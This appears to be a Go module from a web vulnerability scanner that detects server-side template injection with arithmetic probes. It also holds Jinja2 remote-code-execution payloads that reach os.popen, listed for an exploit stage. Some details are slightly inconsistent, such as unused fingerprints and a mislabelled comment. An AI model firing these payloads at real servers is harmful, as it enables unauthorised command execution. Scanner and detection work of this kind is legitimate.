package detect

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"math"
	"regexp"
	"strconv"
	"strings"
)

// sstiEngines maps engine-specific arithmetic fingerprints to engine names.
var sstiEngines = []struct {
	engine string
	tpl    func(a, b int) string
	result func() string
}{
	{"Jinja2/Twig", func(a, b int) string { return fmt.Sprintf("{{ %d*%d }}", a, b) }, func() string { return "" }},
	{"Jinja2 (block)", func(a, b int) string { return fmt.Sprintf("{%%s%%}{{ %d*%d }}{%%e%%}", 0, 0) }, func() string { return "" }},
	{" Smarty", func(a, b int) string { return fmt.Sprintf("{math equation=%d*%d}", 2, 21) }, func() string { return "" }},
	{"Freemarker", func(a, b int) string { return fmt.Sprintf("<#assign x=%d*%d>${x}", 2, 21) }, func() string { return "" }},
	{"Velocity", func(a, b int) string { return fmt.Sprintf("#set($x=%d*%d)$x", 2, 21) }, func() string { return "" }},
	{"Pebble", func(a, b int) string { return fmt.Sprintf("{{ %d*%d }}", a, b) }, func() string { return "" }},
}

// sstiMathPairs are small arithmetic pairs whose product is unambiguous.
var sstiMathPairs = [][2]int{{7, 7}, {6, 9}, {13, 3}}

// sstiMarker builds a unique string marker for reflection checks.
func sstiMarker() string {
	b := make([]byte, 3)
	_, _ = rand.Read(b)
	return "vx" + hex.EncodeToString(b)
}

// SSTI detects server-side template injection across Jinja2, Twig,
// Freemarker, Velocity, Smarty and Pebble syntaxes using arithmetic and
// string-concat fingerprints.
type SSTI struct{}

// Name implements Module.
func (SSTI) Name() string { return "ssti" }

// Level implements Module.
func (SSTI) Level() Level { return LevelParam }

// Scan implements Module.
func (SSTI) Scan(ctx context.Context, s *Scanner, p Point) []Finding {
	var out []Finding
	for _, pair := range sstiMathPairs {
		if ctx.Err() != nil {
			return out
		}
		a, b := pair[0], pair[1]
		product := strconv.Itoa(a * b)
		payloads := []string{
			fmt.Sprintf("{{%d*%d}}", a, b),
			fmt.Sprintf("{{ %d * %d }}", a, b),
			fmt.Sprintf("${%d*%d}", a, b),
			fmt.Sprintf("<%%= %d*%d %%>", a, b),
			fmt.Sprintf("#{%d*%d}", a, b),
			fmt.Sprintf("{=%d*%d}", a, b),
		}
		for _, payload := range payloads {
			resp, err := s.Fire(ctx, p, p.Param, payload, false, nil)
			if err != nil {
				continue
			}
			if strings.Contains(resp.Body, product) {
				if base, _ := s.Baseline(ctx, p, false, nil); base != nil && strings.Contains(base.Body, product) {
					continue
				}
				return append(out, Finding{
					ID:       NewID("ssti", p.URL, p.Param, "math", payload),
					Module:   "ssti",
					Title:    "Server-Side Template Injection (SSTI)",
					Severity: SeverityCritical,
					Endpoint: p.URL,
					Method:   p.Method,
					Param:    p.Param,
					Payload:  payload,
					Evidence: fmt.Sprintf("Payload {{%d*%d}} evaluated server-side: product %s rendered in response", a, b, product),
					PoCCurl:  CurlFor(p, payload),
					Description: "Template expressions injected through the parameter are evaluated by the server-side " +
						"templating engine. Depending on the engine this escalates to full RCE (e.g. Jinja2 MRO chains).",
					Remediation: "Never pass user input into template source; use data variables instead. Sandbox template engines.",
				})
			}
		}
	}
	return out
}

// sstiPolyglot is a combined probe that touches many engines at once; kept
// exported for the exploit engine to use during RCE escalation.
const sstiPolyglot = "{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}"

// sstiRCETemplates hold (Jinja2-specific) RCE snippets for the exploit stage.
var sstiRCETemplates = []string{
	`{{ c.__class__.__mro__[1].__subclasses__() }}`,
	`{{ ''.__class__.__mro__[2].__subclasses__()[40]('id', shell=True).communicate() }}`,
	`{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}`,
}

// sstiResultOf computes the product string for a math pair.
func sstiResultOf(a, b int) string {
	return strconv.FormatInt(int64(a)*int64(b), 10)
}

// sstiSafeCheck guards against absurd template outputs (kept for parity).
var _ = math.MaxInt

// engineErrRe matches template engine error leaks.
var engineErrRe = regexp.MustCompile(`(?i)(jinja2|twig error|freemarker|velocity|pebble|smarty error|template error)`)
